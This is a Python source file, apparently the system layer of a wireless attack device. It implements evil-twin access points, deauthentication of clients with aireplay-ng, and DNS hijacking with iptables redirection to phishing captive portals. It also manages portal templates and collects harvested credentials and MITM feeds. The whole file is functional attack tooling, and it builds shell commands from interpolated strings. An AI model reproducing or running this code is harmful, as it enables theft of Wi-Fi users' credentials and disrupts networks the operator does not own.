"""System interaction layer — all subprocess calls live here."""
import subprocess, os, json, re, shutil, urllib.request, base64
from config import *

# ── Shell helpers ────────────────────────────────────────────────────────────

def sh(cmd: str, timeout: int = 30) -> str:
    """Run a trusted internal shell command. Never pass unsanitised user input."""
    try:
        return subprocess.check_output(
            cmd, shell=True, stderr=subprocess.DEVNULL, timeout=timeout
        ).decode("utf-8", "replace").strip()
    except Exception:
        return ""

def safe_run(args: list, timeout: int = 10) -> bool:
    """Run a command as a list (no shell expansion). Returns True on success."""
    try:
        subprocess.run(args, check=True, timeout=timeout,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

# ── Network / AP ─────────────────────────────────────────────────────────────

def set_dns(cfg: str):
    with open(DNSCFG, "w") as f:
        f.write(cfg)
    sh("pkill -f 'conf-file=.*pinacola-dnsmasq'")
    sh(f"dnsmasq --conf-file={DNSCFG}")

def ap_up():
    sh(f"pkill hostapd; sleep 1; nmcli dev set wlan0 managed no 2>/dev/null; "
       f"ip addr flush dev wlan0; ip addr add 192.168.66.1/24 dev wlan0; "
       f"ip link set wlan0 up; hostapd -B {HOSTAPD}")

def ap_start():
    ap_up()
    cfg = open(DNSCFG).read() if os.path.exists(DNSCFG) else ""
    if "address=/#/" in cfg:
        sh(f"pkill -f 'conf-file=.*pinacola-dnsmasq'; dnsmasq --conf-file={DNSCFG}")
    else:
        set_dns(DNS_NORMAL)
    sh("sysctl -w net.ipv4.ip_forward=1")

def ap_state():
    up = bool(sh("pgrep hostapd"))
    ssid = ch = ""
    if os.path.exists(HOSTAPD):
        for l in open(HOSTAPD):
            l = l.strip()
            if l.startswith("ssid="):    ssid = l[5:]
            if l.startswith("channel="): ch   = l[8:]
    return up, ssid, ch

def ap_cfg():
    ssid = sec = ""
    if os.path.exists(HOSTAPD):
        t = open(HOSTAPD).read()
        for l in t.splitlines():
            if l.startswith("ssid="): ssid = l[5:]
        sec = "wpa=2" in t
    return ssid, sec

def set_eviltwin(ssid: str):
    # ssid already stripped and length-capped by caller
    with open(HOSTAPD, "w") as f:
        f.write(f"interface=wlan0\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\n")
    ap_up()

def set_normal_ap():
    with open(HOSTAPD, "w") as f:
        f.write(HOSTAPD_WPA)
    ap_up()

def clients():
    result = []
    leases = {}
    if os.path.exists(LEASES):
        for l in open(LEASES):
            p = l.split()
            if len(p) >= 4:
                leases[p[1].upper()] = (p[2], p[3])
    try:
        for l in sh("iw dev wlan0 station dump").splitlines():
            if l.startswith("Station"):
                mac = l.split()[1].upper()
                ip, name = leases.get(mac, ("", ""))
                sig = ""
                result.append((mac, ip, name, sig))
            elif "signal:" in l and result:
                result[-1] = (*result[-1][:3], l.split("signal:")[1].split()[0] + " dBm")
    except Exception:
        pass
    return result

def creds():
    if not os.path.exists(CRED):
        return []
    return [l.rstrip() for l in open(CRED) if l.strip()][-20:]

def dnsfeed():
    if not os.path.exists(FEED):
        return []
    return [l.rstrip() for l in open(FEED) if l.strip()][-30:]

def mitmfeed():
    if not os.path.exists(MITMFEED):
        return []
    return [l.rstrip() for l in open(MITMFEED) if l.strip()][-20:]

def wifitest_result():
    if not os.path.exists(WTRESULT):
        return ""
    return open(WTRESULT).read().strip()

def mitm_ready():
    d = {}
    if not os.path.exists(MITMREADY):
        return None
    for l in open(MITMREADY):
        l = l.strip()
        if "=" in l:
            k, v = l.split("=", 1)
            d[k] = v
    return d if d.get("KEY") else None

def mitm_attack_state():
    s = open(MITMSTATE).read().strip() if os.path.exists(MITMSTATE) else "idle"
    if s == "running" and not sh("pgrep -f mitm-attack.sh"):
        s = "stopped"
    return s

def portal_on_state():
    cfg = open(DNSCFG).read() if os.path.exists(DNSCFG) else ""
    return ("address=/#/" in cfg) and bool(sh(f"pgrep -f {PORTAL}"))

def portal_on():
    set_dns(DNS_PORTAL)
    sh("iptables -t nat -C PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT "
       "--to-destination 192.168.66.1:80 2>/dev/null || "
       "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT "
       "--to-destination 192.168.66.1:80")
    sh(f"pkill -f {PORTAL}")
    sh(f"nohup python3 {PORTAL} >/tmp/portal.log 2>&1 &")

def portal_off():
    sh(f"pkill -f {PORTAL}")
    sh("iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT "
       "--to-destination 192.168.66.1:80 2>/dev/null")
    set_dns(DNS_NORMAL)

def deauth(bssid: str, ch: str):
    # bssid and ch are already regex-validated by the caller
    sh("systemctl stop kismet-sensor.service")
    sh(f"ip link set wlan1 down; iw dev wlan1 set type monitor; "
       f"ip link set wlan1 up; iw dev wlan1 set channel {ch}")
    sh(f"timeout 7 aireplay-ng -0 10 -a {bssid} wlan1")
    sh("systemctl start kismet-sensor.service")

def kcreds():
    u = p = ""
    if os.path.exists(KCONF):
        t = open(KCONF).read()
        mu = re.search(r"httpd_username=(.*)", t)
        mp = re.search(r"httpd_password=(.*)", t)
        if mu: u = mu.group(1).strip()
        if mp: p = mp.group(1).strip()
    return u, p

def kapi(path: str):
    u, p = kcreds()
    try:
        r = urllib.request.Request("http://127.0.0.1:2502" + path)
        if u:
            r.add_header("Authorization", "Basic " +
                         base64.b64encode(f"{u}:{p}".encode()).decode())
        return json.load(urllib.request.urlopen(r, timeout=2))
    except Exception:
        return None

def k_alerts():
    d = kapi("/alerts/last-time/0/alerts.json")
    if not isinstance(d, list):
        return None
    return [(a.get("kismet.alert.header", "?"),
             int(a.get("kismet.alert.severity", 0)),
             a.get("kismet.alert.text", "")[:100]) for a in d[-8:]]

def k_count():
    d = kapi("/system/status.json")
    return d.get("kismet.system.devices.count", "?") if isinstance(d, dict) else "?"

_cpu_prev = None
def sys_stats():
    global _cpu_prev
    try:
        line = open("/proc/stat").readline()
        vals = [int(x) for x in line.split()[1:]]
        idle = vals[3]; total = sum(vals)
        if _cpu_prev:
            d_idle = idle - _cpu_prev[0]; d_total = total - _cpu_prev[1]
            cpu = min(100, round((1 - d_idle / max(d_total, 1)) * 100, 1))
        else:
            cpu = 0
        _cpu_prev = (idle, total)
    except Exception:
        cpu = 0
    try:
        mem = {}
        for l in open("/proc/meminfo"):
            k, v = l.split(":", 1)
            mem[k.strip()] = int(v.strip().split()[0])
        ram = round((mem["MemTotal"] - mem.get("MemAvailable", mem["MemTotal"])) /
                    mem["MemTotal"] * 100, 1)
    except Exception:
        ram = 0
    try:
        secs = int(float(open("/proc/uptime").read().split()[0]))
        h, r = divmod(secs, 3600); m = r // 60
        uptime = (str(h) + "h " + str(m) + "m") if h else (str(m) + "m")
    except Exception:
        uptime = "?"
    return cpu, ram, uptime

def parse_scan():
    f = "/tmp/scan-01.csv"
    if not os.path.exists(f):
        return []
    aps = []; in_aps = True
    for line in open(f, errors="replace"):
        line = line.strip()
        if line.startswith("Station MAC"):
            in_aps = False; continue
        if not in_aps or not line:
            continue
        parts = [x.strip() for x in line.split(",")]
        if len(parts) < 14 or parts[0] == "BSSID":
            continue
        try:
            bssid, ch, enc, power, ssid = parts[0], parts[3], parts[5], parts[8], parts[13]
            if bssid and len(bssid) == 17:
                aps.append({"bssid": bssid, "ssid": ssid, "ch": ch,
                            "enc": enc, "power": power})
        except Exception:
            pass
    return aps

def parse_channel_stats():
    f = "/tmp/scan-01.csv"
    if not os.path.exists(f):
        return {}
    ch = {}; in_aps = True
    for line in open(f, errors="replace"):
        line = line.strip()
        if line.startswith("Station MAC"):
            in_aps = False; continue
        if not in_aps or not line:
            continue
        parts = [x.strip() for x in line.split(",")]
        if len(parts) < 14 or parts[0] == "BSSID":
            continue
        try:
            c = int(parts[3])
            if 1 <= c <= 13:
                ch[str(c)] = ch.get(str(c), 0) + 1
        except Exception:
            pass
    return ch

def recon_scan():
    sh("systemctl stop kismet-sensor.service; pkill -9 -f kismet_cap_linux_wifi; sleep 1")
    sh("nmcli dev set wlan1 managed no 2>/dev/null; ip link set wlan1 down; "
       "iw dev wlan1 set type monitor; ip link set wlan1 up 2>/dev/null")
    sh("rm -f /tmp/scan-*.csv")
    sh("nohup bash -c 'timeout 15 airodump-ng --output-format csv -w /tmp/scan wlan1 "
       ">/dev/null 2>&1; systemctl start kismet-sensor.service' &")

def ble_scan_start():
    sh("hciconfig hci0 up 2>/dev/null")
    with open(BLESTATE, "w") as f:
        f.write("running")
    sh(f"nohup bash -c 'python3 {BLEPY} > {BLESCAN} 2>/tmp/ble-scan.log; "
       f"echo done > {BLESTATE}' &")

def ble_scan_state():
    return open(BLESTATE).read().strip() if os.path.exists(BLESTATE) else "idle"

def ble_scan_results():
    if not os.path.exists(BLESCAN):
        return []
    try:
        return json.load(open(BLESCAN))
    except Exception:
        return []

def beacon_spam_active():
    return bool(sh("pgrep mdk4"))

# ── Portal template management ───────────────────────────────────────────────

def ensure_portals_dir():
    os.makedirs(PORTALS_DIR, exist_ok=True)

def list_portals():
    ensure_portals_dir()
    return [f[:-5] for f in sorted(os.listdir(PORTALS_DIR))
            if f.endswith(".html") and f != "active.html"]

def read_portal_html(name: str) -> str:
    p = os.path.join(PORTALS_DIR, name + ".html")
    if not os.path.exists(p):
        return ""
    return open(p, encoding="utf-8", errors="replace").read()

def save_portal_html(name: str, html_content: str) -> str:
    ensure_portals_dir()
    safe = "".join(c for c in name if c.isalnum() or c in "-_")[:40] or "portal"
    with open(os.path.join(PORTALS_DIR, safe + ".html"), "w", encoding="utf-8") as f:
        f.write(html_content)
    return safe

def delete_portal_file(name: str):
    p = os.path.join(PORTALS_DIR, name + ".html")
    if os.path.exists(p):
        os.remove(p)

def activate_portal_file(name: str):
    ensure_portals_dir()
    src = os.path.join(PORTALS_DIR, name + ".html")
    if not os.path.exists(src):
        return
    shutil.copy2(src, ACTIVE_TPL)
    with open(ACTIVE_NAME_F, "w") as f:
        f.write(name)

def portal_active_name() -> str:
    if os.path.exists(ACTIVE_NAME_F):
        return open(ACTIVE_NAME_F).read().strip()
    return ""

def read_creds_json():
    if not os.path.exists(CREDS_JSON):
        return []
    try:
        return json.load(open(CREDS_JSON))
    except Exception:
        return []

# ── Live API snapshot ────────────────────────────────────────────────────────

def api_live():
    cl = clients()
    cl_data = [{"mac": m, "ip": i, "name": n, "signal": s} for m, i, n, s in cl]
    mr = mitm_ready(); up, ssid, _ = ap_state(); cpu, ram, uptime = sys_stats()
    return {
        "kismet":    sh("systemctl is-active kismet-sensor.service"),
        "k_count":   str(k_count()),
        "dns":       dnsfeed(),
        "mitm_feed": mitmfeed(),
        "wt_result": wifitest_result(),
        "mitm_state":mitm_attack_state(),
        "mitm_ready":mr,
        "clients":   len(cl),
        "clients_data": cl_data,
        "creds":     len(creds()),
        "ap_up":     up,
        "ap_ssid":   ssid,
        "portal":    portal_on_state(),
        "portal_active_name": portal_active_name(),
        "portal_creds": read_creds_json()[-20:],
        "cpu":        cpu,
        "ram":        ram,
        "uptime":     uptime,
        "scan":       parse_scan(),
        "channel_stats": parse_channel_stats(),
        "ble_state":  ble_scan_state(),
        "ble_devices":ble_scan_results(),
        "beacon_spam":beacon_spam_active(),
    }
